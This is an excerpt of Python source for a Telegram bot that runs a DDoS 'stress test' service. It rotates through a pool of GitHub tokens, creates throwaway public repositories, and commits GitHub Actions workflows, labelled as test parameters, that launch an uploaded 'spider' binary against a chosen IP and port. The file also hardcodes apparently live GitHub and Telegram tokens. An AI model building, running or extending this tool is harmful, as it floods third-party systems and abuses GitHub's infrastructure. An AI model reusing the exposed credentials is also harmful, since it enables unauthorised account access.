...
curl -L -X DELETE \
  ...
  -H "Authorization: Bearer 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" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  https://api.github.com/repos/DREK69/SpiderStressTest-tg
"""
...
BOT_TOKEN = "8542620820:AAFzc4MU0H--rHPmpcsCXf0O4v-wHyjiadw"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "spider"
ADMIN_IDS = [8819216195]
OWNER_IDS = [8819216195]
...
async def get_github_token(github_tokens):
    global github_token_index
    github_token_index += 1
    if github_token_index >= len(github_tokens):
        github_token_index = 0
    return github_tokens[github_token_index]
    ...
    try:
        ...
        try:
            ...
            repo = user.create_repo(
                repo_name,
                description=f"{repo_name} Bot Repository",
                private=False,
                auto_init=False
            )
            return repo, True
...
"""
    ...
    try:
        ...
        try:
            ...
            repo.update_file(
                YML_FILE_PATH,
                f"Update test parameters - a{str(ip).replace('.','•')}={port}",
                yml_content,
                file_content.sha
            )
            ...
            repo.create_file(
                YML_FILE_PATH,
                f"Create test parameters - a{str(ip).replace('.','•')}={port}",
                yml_content
            )
...
async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    token_data = await get_github_token(github_tokens)
    ...
    message = (
        ...
        f"🖥️ success count: `{success_count}`\n"
        f"⭐ used token: `{token_data['token'][:10]}`\n"
        f"🙇 used account: `{token_data['username']}`\n"
        f"🕸️ total tokens: `{len(github_tokens)}`\n"
...
async def addtoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    repo_name = random.choice(["spider", "thor", "antman", "catwoman", "batman", "ironman", "superman", "flash", "hulk", "loki", "deadpool", "wolverine", "venom", "thanos", "drstrange", "blackpanther", "captainamerica", "hawkeye", "falcon", "vision", "aquaman", "cyborg", "greenlantern", "nightwing", "robin", "joker", "harleyquinn", "riddler", "penguin", "bane", "constantine", "raven", "starfire", "beastboy", "redhood", "ghostrider", "blade", "punisher", "moonknight", "daredevil", "storm", "rogue", "gambit", "cyclops", "phoenix", "colossus", "mystique", "ultron", "magneto"]) + f"-{uuid.uuid4().hex[:12]}"
...
async def binary_upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await update.message.reply_text(
        ...
        "ɪᴛ ᴡɪʟʟ ʙᴇ ᴜᴘʟᴏᴀᴅᴇᴅ ᴛᴏ ᴀʟʟ ɢɪᴛʜᴜʙ ʀᴇᴘᴏs ᴀs `spider` ғɪʟᴇ."
    )
